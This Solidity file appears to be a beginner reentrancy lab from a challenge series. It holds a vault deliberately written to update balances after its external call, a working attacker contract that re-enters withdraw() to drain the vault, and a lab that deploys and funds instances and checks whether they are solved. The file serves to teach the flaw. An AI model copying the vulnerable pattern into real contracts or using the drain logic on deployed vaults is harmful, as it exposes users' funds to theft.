// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {SolvableBase} from "@common/SolvableBase.sol";

/// @notice Minimal CEI-violating vault. Identical pattern to q-09 but with a
///         smaller seed so the scenario stays focused.
contract Q19VulnerableMiniVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no balance");

        // BAD: external call before state update.
        (bool ok,) = msg.sender.call{value: bal}("");
        require(ok, "transfer failed");

        balances[msg.sender] = 0;
    }

    receive() external payable {}
}

/// @notice Per-user helper contract. Unlike q-09 this helper is pre-funded
///         by the lab with `BAIT`.
contract Q19BasicAttacker {
    Q19VulnerableMiniVault public immutable vault;
    address public immutable owner;
    uint256 public immutable attackAmount;

    /// @dev `payable` so the lab can fund the bait at construction time.
    constructor(Q19VulnerableMiniVault v, address o, uint256 bait) payable {
        require(msg.value == bait, "bait mismatch");
        vault = v;
        owner = o;
        attackAmount = bait;
    }

    /// @notice Owner-only entry point for the helper scenario.
    function attack() external {
        require(msg.sender == owner, "only owner");
        require(address(this).balance >= attackAmount, "no bait funded");
        vault.deposit{value: attackAmount}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            vault.withdraw();
        }
    }

    /// @notice Forward this helper's ETH balance back to the owner.
    function drain() external {
        require(msg.sender == owner, "only owner");
        (bool ok,) = payable(owner).call{value: address(this).balance}("");
        require(ok, "drain failed");
    }
}

/// @notice Multi-tenant beginner reentrancy lab. Each user calls
///         `createInstance()` once; the lab deploys a fresh
///         `(Q19VulnerableMiniVault, Q19BasicAttacker)` pair, pre-seeds the vault
///         with `SEED` ETH, and funds the attacker with `BAIT` ETH.
///
///         Compared to q-09, this variant uses a smaller seed and lab-funded
///         bait so the setup has fewer moving parts.
///
///         The lab itself must hold enough ETH at deploy time to seed every
///         expected instance — see the funded `receive()`.
contract Q19ReentrancyBasicLab is SolvableBase {
    struct Instance {
        Q19VulnerableMiniVault vault;
        Q19BasicAttacker attacker;
    }

    uint256 public constant SEED = 0.005 ether;
    uint256 public constant BAIT = 0.00005 ether;

    mapping(address => Instance) private _instances;

    event InstanceCreated(address indexed user, address vault, address attacker);

    receive() external payable {}

    function createInstance() external returns (address vault, address attacker) {
        require(address(_instances[msg.sender].vault) == address(0), "already created");
        require(address(this).balance >= SEED + BAIT, "lab underfunded");

        Q19VulnerableMiniVault v = new Q19VulnerableMiniVault();
        // Helper receives the bait at construction time.
        Q19BasicAttacker a = new Q19BasicAttacker{value: BAIT}(v, msg.sender, BAIT);

        // Lab acts as the "victim depositor" — pre-funds the vault.
        v.deposit{value: SEED}();

        _instances[msg.sender] = Instance(v, a);
        emit InstanceCreated(msg.sender, address(v), address(a));
        return (address(v), address(a));
    }

    function vaultOf(address user) external view returns (Q19VulnerableMiniVault) {
        return _instances[user].vault;
    }

    function attackerOf(address user) external view returns (Q19BasicAttacker) {
        return _instances[user].attacker;
    }

    function isSolved(address user) public view override returns (bool) {
        Instance memory inst = _instances[user];
        if (address(inst.vault) == address(0)) return false;
        return address(inst.vault).balance == 0 && address(inst.attacker).balance >= SEED;
    }
}
